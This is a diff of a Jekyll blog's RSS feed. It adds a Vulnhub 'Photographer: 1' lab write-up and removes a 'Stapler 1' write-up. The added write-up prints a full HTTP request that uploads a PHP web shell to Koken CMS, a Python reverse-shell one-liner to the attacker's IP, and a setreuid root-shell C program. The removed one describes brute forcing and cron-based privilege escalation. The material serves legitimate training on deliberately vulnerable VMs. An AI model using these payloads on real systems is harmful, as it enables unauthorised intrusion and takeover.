@@ -6,8 +6,8 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 24 Aug 2020 08:54:26 -0400</pubDate>
-    <lastBuildDate>Mon, 24 Aug 2020 08:54:26 -0400</lastBuildDate>
+    <pubDate>Mon, 24 Aug 2020 12:27:07 -0400</pubDate>
+    <lastBuildDate>Mon, 24 Aug 2020 12:27:07 -0400</lastBuildDate>
     <generator>Jekyll v4.1.1</generator>
     
       <item>
@@ -67,6 +67,134 @@ I spent a lot of time with this, but I couldn’t get anything. I tried writing 
         <pubDate>Mon, 24 Aug 2020 00:00:00 -0400</pubDate>
         <link>http://localhost:4000/write-ups/pwnos-2-writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/write-ups/pwnos-2-writeup/</guid>
+        
+        
+        <category>write-ups</category>
+        
+      </item>
+    
+      <item>
+        <title>Photographer: 1 Write-Up</title>
+        <description>&lt;p&gt;Photographer: 1 is a relatively new machine in Vulnhub, which was developed to help on the preparation for OSCP. The goal is to get the two flags inside of the machine (user.txt and proof.txt).&lt;/p&gt;
+&lt;h1&gt;Network Scan&lt;/h1&gt;
+&lt;p&gt;As always, I’ve used Nmap to sweep the network to find the IP of the target machine.
+&lt;img src=&quot;network.png&quot; alt=&quot;Network Scan&quot; /&gt;
+10.10.10.10 is the IP of my machine, so 10.10.10.128 is the target machine.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1&gt;Port Scan&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;port.png&quot; alt=&quot;Port scan&quot; /&gt;
+This machine has two HTTP ports and two SMB ports. I usually start with the HTTP ones because I find myself more comfortable working with them, but this time I decided to start with SMB.&lt;/p&gt;
+&lt;h1&gt;SMB Enumeration&lt;/h1&gt;
+&lt;p&gt;First, I enumerated the shares using smbclient.
+&lt;img src=&quot;shares.png&quot; alt=&quot;SMB Shares&quot; /&gt;
+The only interesting share is “sambashare”, so I tried to read it without password. 
+&lt;img src=&quot;sambaShareList.png&quot; alt=&quot;SMB list&quot; /&gt;
+It worked, so I downloaded the two files to my machine to inspect them more easily. The wordpress.bkp.zip has a fresh installation of Wordpress 5.4.2 (as seen in the wp-includes/version.php file) while the mailsent.txt is an email to a user called Daisa.
+&lt;img src=&quot;wordpress.png&quot; alt=&quot;Wordpress Version&quot; /&gt;
+&lt;img src=&quot;mailsent.png&quot; alt=&quot;Mail&quot; /&gt;
+I also used enum4linux to get a bit more information, which got me two users on the machine.
+&lt;img src=&quot;enum4linux.png&quot; alt=&quot;Enum4linux&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
+&lt;p&gt;At a first glance port 80 doesn’t have anything interesting, but after rooting the machine I found that the koken directory could be accessed from there (if you can find it fuzzing the directories). This isn’t necessary as port 8000 directs you to the koken directory.&lt;/p&gt;
+&lt;h1&gt;Port 8000 Enumeration&lt;/h1&gt;
+&lt;p&gt;I found both on the NSE Scripts output and the page source the “Koken 0.22.24” string, which refers to the CMS used to build the page. There is &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;an entry on ExploitDB with an authenticated Arbitrary File Upload&lt;/a&gt; for this version (later I found that the author of the entry is the creator of the machine).&lt;br /&gt;
+On the timeline page of the blog there is a shell.php file which attempts to connect to a machine, so it is confirmed that the exploit works on the installed version.
+&lt;img src=&quot;shellTime.png&quot; alt=&quot;Shell.php Timeline&quot; /&gt;
+&lt;img src=&quot;shellTime2.png&quot; alt=&quot;Shell.php Timeline 2&quot; /&gt;
+There is a login form on the admin directory but I didn’t found any credential for it yet. After searching for default credentials on the internet or hidden files I decided to go back to my notes and read again the email found on the SMB share.&lt;br /&gt;
+I guessed that the email used on the blog was “daisa@photographer.com” as the blog is “Daisa Website’s”. For the password I used “babygirl” because it really caught my attention.
+&lt;img src=&quot;loginForm.png&quot; alt=&quot;Login form&quot; /&gt;
+The credentials “daisa@photographer.com” and “babygirl” worked, so I followed the &lt;a href=&quot;https://www.exploit-db.com/exploits/48706&quot;&gt;exploit&lt;/a&gt; to upload my shell. I won’t explain the process as the ExploitDB explanation is good enough, but I’ll leave the HTTP Request that I used which should be enough to upload the shell.
+&lt;img src=&quot;uploadShell1.png&quot; alt=&quot;Upload Shell 1&quot; /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api.php?/content&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10.10.10.128:8000&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*/*&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://10.10.10.128:8000/admin/&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;x-koken-auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cookie&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;multipart/form-data; boundary=---------------------------888515285638187952681108602&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1077&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;koken_referrer=; koken_session_ci=azOCz7y1EQ2C8yqnmyADuudfsvdiw%2FsIERGMOrBHoMsQCLat9AQJq4hvGRG6arJqXcbdLAhIsMsFnFMzODgYRPEX5oaDfc0m9lRI3i4yDMq72RARdKf3etn6FzFBA4pJjQwVE2iBvvGNcKsVdf8eyB1GRmT1fActCB%2FcvgePW1t0cnIzBJx5rG1SGaDl1bFMCT1mmUP%2FZ5N%2Bl6ZSqTlyiWVs4ApVix06L6EMbw97WlAbyOFNl4jZwZKTjC%2FQo3KS514nXCz2iaf26Kc6blUq3bCRT3KUMdxZ%2FznD%2ByrwKApQsbWHKp6p%2BNavZ0tVWUpPZYNhTCrk1xuTnyIl92FqHcuu%2BS2id6XvjODFeSva1bsX1i1SjeJ9ec25xQdVcwKQ2oKCF9NahZvoy8ofCJ5c3c4tM%2B%2BM5jB55vK2q%2B%2FOBdAq0kCVameuSsIgRymlbbKbtnl6lNm%2BO8rsVTxrvFYfy8OeCgtVESGZqjz3JwrLWMVavxeWFKcCk1ZLpIqRmUer%2FIqkOm8sGb7l9GnnxfbFHP4dKKLi39S6UNPqYESpYpK9BfOyYI%2FaQusRG5RmltKso5%2B2l38l07NrbnsZ0qahDV4pdQJzLUhJXjJIAAONMDjKGLxcv%2F5l5ZZulM7lE0dlnVGfGjhxEhXof7AZ0GB3zJhGJDN3N9SLpQd7JYe9ZLM24GpY3at4RWCnnCgp%2FcbfWdCz%2FEshN9yspvMiNPv%2FFeF6BrtcXndy46ErPEY9St6ay1LzikQ4l2mZdn2E6GZyuttH%2FOVJEI12u70aRWSTQLuAs5TTtAbyn58Q7OJJIBPpX6vSEMAq1vJB1FlQ3CSCTE8mrAfp%2FNhQx4t7QrtNbBJJCV%2Bk7cYb8AUiBBuuk1h8Vi51wfPCWCstJHqSZXQgDs2DWJ3sbYEEGXZ38AgjbjYI7i3PcDl9dOb2PqHCEwfuGKHrgFpXGxsZkjO8vbNYM3dOvju5IXDtDp%2BVDCxFp7bQ0SxIq00T2qhDNRnjH1HdF7xInwD%2FMXT%2BnT4srGRB5xQI%2BMoy4GlHPwGSZf4LTq1y0Wq4TdTUryVC8CaBMle4iowOZ5fzY1zimG5dNkJrtWSW1ilBV8KLXRIeMwjgSzwqcR3%2BXsyP08wG%2FEixfvRqAFsze4s6M%2FHrUc%2BA2o4UjP82nNFfnMxBoMRoiuoE2m46kZnzlS1jSKp%2FS4Xs747%2FEz7dFFdqTvQFLtFkG0mZQcln55%2FXlM4ztPem2FbGioIkvUk0IB%2Bh10LK4abxQ6avAYP1V3ipaiWEgz%2BBty3t3615e0bf1ba28084be86fbe55846d5c1b6d9fb21&lt;/span&gt;
+
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;name&quot;
+
+shell2.php
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;chunk&quot;
+
+0
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;chunks&quot;
+
+1
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;upload_session_start&quot;
+
+1598278209
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;visibility&quot;
+
+public
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;license&quot;
+
+all
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;max_download&quot;
+
+none
+-----------------------------888515285638187952681108602
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php.jpg&quot;
+Content-Type: image/jpeg
+
+ÿØÿÛ&amp;lt;?php system($_REQUEST[cmd])?&amp;gt;
+
+-----------------------------888515285638187952681108602--&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;uploadShell2.png&quot; alt=&quot;Upload Shell 2&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;www-data Shell&lt;/h1&gt;
+&lt;p&gt;I used the “python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’” command to get a reverse shell.
+&lt;img src=&quot;revShell.png&quot; alt=&quot;Reverse Shell&quot; /&gt;
+I found the user.txt flag in the /home/daisa/ directory and I also found the credentials used to access the MySQL server inside the /var/www/html/koken/storage/configuration/database.php after spending a while searching for them, even though I didn’t find anything useful inside the server.
+&lt;img src=&quot;dbcreds.png&quot; alt=&quot;DB credentials&quot; /&gt;
+After this, I used the LinEnum script to enumerate the SUID binaries and I noticed that php7.2 had the SUID bit enabled, which looked really promising.
+&lt;img src=&quot;suidbin.png&quot; alt=&quot;SUID Binaries&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;PrivEsc to Root&lt;/h1&gt;
+&lt;p&gt;There is an entry on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/php/&quot;&gt;GTFOBins&lt;/a&gt; for php with SUID, so I followed the instructions to get a root shell.
+&lt;img src=&quot;privesc1.png&quot; alt=&quot;PrivEsc 1&quot; /&gt;
+As seen in the image, the shell has an effective UID of 0 which means that we have root privileges, but some programs ignore the EUID. In my &lt;a href=&quot;https://barvent.github.io/write-ups/mrrobot_1_writeup/&quot;&gt;write-up for the Mr Robot 1 machine&lt;/a&gt; I didn’t try to get UID of 0, so I’ll show a way to do it in this write-up.&lt;/p&gt;
+&lt;h1&gt;Changing EUID to UID&lt;/h1&gt;
+&lt;p&gt;Probably there are faster ways, but I’ll explain the one that I know because it only requires to have access to a compiler. To this method we need to write a C code that uses the SetRUID system call and then gives us a shell.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setuid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error executing command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Once we have the code we only need to upload it to the machine, compile it and run it to get a shell with UID of 0 (and more interactive than the one we had before).
+&lt;img src=&quot;EUID2UID.png&quot; alt=&quot;EUID2UID&quot; /&gt;
+The last flag is in the /root/ directory.&lt;/p&gt;
+&lt;h1&gt;Conclusions&lt;/h1&gt;
+&lt;p&gt;This is an easy machine which involves a little bit of guessing at the beginning and basic knowledge of cybersecurity. I probably spent more time than necessary on this machine because I wanted to find the credentials for the database, but I feel satisfied because I was able to guess the Koken admin credentials pretty fast.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 24 Aug 2020 00:00:00 -0400</pubDate>
+        <link>http://localhost:4000/write-ups/photographer_1_writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/write-ups/photographer_1_writeup/</guid>
         
         
         <category>write-ups</category>
@@ -690,111 +818,6 @@ As I said before, this is the last easy box in the list, so I don’t know if I�
         <pubDate>Tue, 07 Jul 2020 00:00:00 -0400</pubDate>
         <link>http://localhost:4000/write-ups/pwnlab_init_writeup/</link>
         <guid isPermaLink="true">http://localhost:4000/write-ups/pwnlab_init_writeup/</guid>
-        
-        
-        <category>write-ups</category>
-        
-      </item>
-    
-      <item>
-        <title>Stapler 1 Write-Up</title>
-        <description>&lt;p&gt;Stapler 1 is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.&lt;br /&gt;
-As stated in the Vulnhub page, there are 2 intended ways to obtain a limited shell and 3 intended ways to obtain root.&lt;/p&gt;
-&lt;h1&gt;Network Scan&lt;/h1&gt;
-&lt;p&gt;In this case, the machine doesn’t tell us its IP address, so I used Nmap to scan the network and find it.
-&lt;img src=&quot;netScan.png&quot; alt=&quot;Network Scan Result&quot; /&gt;
-I know that 192.168.56.1 is the gateway and 192.168.56.10 is the Kali machine, so 192.168.56.128 must be the target box.
-&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;Port Scan&lt;/h1&gt;
-&lt;p&gt;The port scan reveals lots of open ports, including one which is unusally high. 
-&lt;img src=&quot;allPortsScan.png&quot; alt=&quot;Port scan result&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;FTP Anonymous Login&lt;/h1&gt;
-&lt;p&gt;Port 21 has a ftp server with anonymous access configured, as shown in the Nmap output.
-&lt;img src=&quot;ftpNmap.png&quot; alt=&quot;FTP Nmap output&quot; /&gt;
-Just from connecting we get a possible user (Harry) and using user = anonymous and any password we get anonymous access, with allows us to read a file with two possible usernames (Elly and John).
-&lt;img src=&quot;ftpAnon1.png&quot; alt=&quot;FTP Anon 1&quot; /&gt;
-&lt;img src=&quot;ftpAnon2.png&quot; alt=&quot;FTP Anon 2&quot; /&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;Elly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sure&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Leave&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FTP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;once&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;John&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Reading other people write-ups I found that Elly uses the password ylle for her ftp account, but I used another method to get access.
-&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;HTTP Port 80&lt;/h1&gt;
-&lt;p&gt;Here there isn’t anything interesting, using gobuster we can find that it is serving a home directory but I didn’t find anything useful (it is the /home/www/ directory, which is world writable).
-&lt;img src=&quot;root80.png&quot; alt=&quot;Root HTTP 80&quot; /&gt;
-&lt;img src=&quot;gobuster80.png&quot; alt=&quot;Gobuster HTTP 80&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;Samba Enumeration&lt;/h1&gt;
-&lt;p&gt;Port 139 has a Samba server which allows Guest login. There isn’t anything interesting inside the shares, but using enum4linux we can enumerate the users.
-&lt;img src=&quot;smbmap.png&quot; alt=&quot;SMBMap&quot; /&gt;
-&lt;img src=&quot;enum4linux.png&quot; alt=&quot;enum4linux users&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;Obtaining Credentials (Method 1)&lt;/h1&gt;
-&lt;p&gt;At this point I got stucked because of the rabbit holes in the other ports (except 12380, but I will talk about this one in the second method). I tried using Hydra to bruteforce the ftp credentials, using the user list as input for both the user and the password.
-&lt;img src=&quot;hydraFTP.png&quot; alt=&quot;Hydra ftp&quot; /&gt;
-If we access the ftp server using these credentials we get into the /etc/ directory. I searched for sensible information inside the directory, but I only found the /etc/password file which contains all the users inside of the box.
-I used the same method as before to bruteforce the credentials for the ssh, only to find out that SHayslett uses the same password as before for his user account.
-&lt;img src=&quot;hydraSSH.png&quot; alt=&quot;Hydra ssh&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;Method 2&lt;/h1&gt;
-&lt;p&gt;At first glance port 12380 doesn’t have anything (except for another username), but if we inspect the responses using Burpsuite we can see that something is odd, the server always responds with a 400 Bad Request.
-&lt;img src=&quot;root12380_1.png&quot; alt=&quot;Root HTTP 12380 1&quot; /&gt;
-&lt;img src=&quot;comment12380_1.png&quot; alt=&quot;Comment with user&quot; /&gt;
-&lt;img src=&quot;burpIntercept.png&quot; alt=&quot;Burp intercept&quot; /&gt;
-Using Nikto we can see that the server wants to use HTTPS, that’s why we are getting a 400 response. Also, we can see that there is a robots.txt file with some disallowed entries.
-&lt;img src=&quot;nikto.png&quot; alt=&quot;Nikto&quot; /&gt;
-The /admin112233 is a troll page, while the /blogblog has a Wordpress blog.
-&lt;img src=&quot;blogblog.png&quot; alt=&quot;blogblog page&quot; /&gt;
-I used wpscan but it couldn’t find anything, so I enumerated it manually.&lt;br /&gt;
-The wp-contents/plugins/ has directory listing enabled, so we can enumerate the plugins. Using searchsploit we can see that one of the plugins was vulnerable in its 1.0 version (I couldn’t find the version of the installed plugin, but it seems to be 1.0).
-&lt;img src=&quot;wpplugins.png&quot; alt=&quot;Wordpress plugins&quot; /&gt;
-&lt;img src=&quot;searchsploitPlugin.png&quot; alt=&quot;Searchsploit plugin&quot; /&gt;
-The searchsploit code didn’t work correctly, but searching in Google I found a &lt;a href=&quot;https://raw.githubusercontent.com/gtech/39646/master/39646.py&quot;&gt;more stable version&lt;/a&gt; which was created for this box.
-&lt;img src=&quot;mysqlCreds.png&quot; alt=&quot;Exploit&quot; /&gt;
-In the output we can see the credentials for the root user of mysql. In the Nikto output we can see that there is a phpmyadmin page, so I used the newly obtained credentials and enumerated the database (which contained interesting information, but nothing useful).&lt;br /&gt;
-I used some SQL tricks to place a simple php shell inside the /wp-content/uploads/ directory and get RCE. (Ignore the typo in the screenshot).
-&lt;img src=&quot;rce1.png&quot; alt=&quot;RCE 1&quot; /&gt;
-&lt;img src=&quot;rce2.png&quot; alt=&quot;RCE 2&quot; /&gt;
-&lt;img src=&quot;rce3.png&quot; alt=&quot;RCE 3&quot; /&gt;
-&lt;img src=&quot;rce4.png&quot; alt=&quot;RCE 4&quot; /&gt;
-At this point we can use a reverse shell to get shell access to the box, but I only used the first method because I prefer to have a more stable shell.&lt;br /&gt;
-Also, Zoe uses the same password as the root database user in the box, so we can get SSH access from there.
-&lt;img src=&quot;hydraSSH2.png&quot; alt=&quot;Hydra ssh 2&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;PrivEsc Method 1 (.bash_history)&lt;/h1&gt;
-&lt;p&gt;Reading the LinEnum output we can see all the contents of the .bash_history of all users. JKanode has two passwords there.
-&lt;img src=&quot;bashhist.png&quot; alt=&quot;Bash history&quot; /&gt;
-Peter can run sudo as root.
-&lt;img src=&quot;sudo1.png&quot; alt=&quot;Sudo 1&quot; /&gt;
-&lt;img src=&quot;sudo2.png&quot; alt=&quot;Sudo 2&quot; /&gt;
-And from here we can read the flag inside the /root/flag.txt file.
-&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;PrivEsc Method 2 (cronjob)&lt;/h1&gt;
-&lt;p&gt;Reading the cron jobs we can see that root runs the /usr/local/sbin/cron-logrotate.sh script every 5 minutes and everyone has permission to write to this file.
-&lt;img src=&quot;cronjob.png&quot; alt=&quot;Cronjob&quot; /&gt;
-This can also be found using the find command.
-&lt;img src=&quot;findWrite.png&quot; alt=&quot;Find writable&quot; /&gt;
-We can just grant sudo privileges to the user that we are using (zoe in my case).
-&lt;img src=&quot;cronModified.png&quot; alt=&quot;Cron modified&quot; /&gt;
-&lt;img src=&quot;zoeSudo.png&quot; alt=&quot;Zoe sudo&quot; /&gt;
-Just remember to remove the command from the cron-logrotate to avoid problems with the /etc/sudoers file.
-&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;PrivEsc Method 3 (Kernel exploit)&lt;/h1&gt;
-&lt;p&gt;Again, reading the LinEnum output we can see the kernel version and the Ubuntu version. Using searchsploit we can see lots of exploits for this version, but most of them are for 64 bits operating systems and the one in the machine uses 32 bits.&lt;br /&gt;
-The exploit was a bit weird and I had to execute it two times before I got root.
-&lt;img src=&quot;kern1.png&quot; alt=&quot;Kern exploit 1&quot; /&gt;
-&lt;img src=&quot;kern2.png&quot; alt=&quot;Kern exploit 2&quot; /&gt;
-&lt;img src=&quot;kern3.png&quot; alt=&quot;Kern exploit 3&quot; /&gt;
-&lt;img src=&quot;kern4.png&quot; alt=&quot;Kern exploit 4&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h1&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;This box has a lot of rabbit holes and can be pretty confusing if you don’t take notes.&lt;br /&gt;
-I’ve learnt how to enumerate Samba shares and use enum4linux, as well as reminding myself to read more carefully the LinEnum output and search for writable files.&lt;/p&gt;
-</description>
-        <pubDate>Thu, 02 Jul 2020 00:00:00 -0400</pubDate>
-        <link>http://localhost:4000/write-ups/stapler_1_writeup/</link>
-        <guid isPermaLink="true">http://localhost:4000/write-ups/stapler_1_writeup/</guid>
         
         
         <category>write-ups</category>
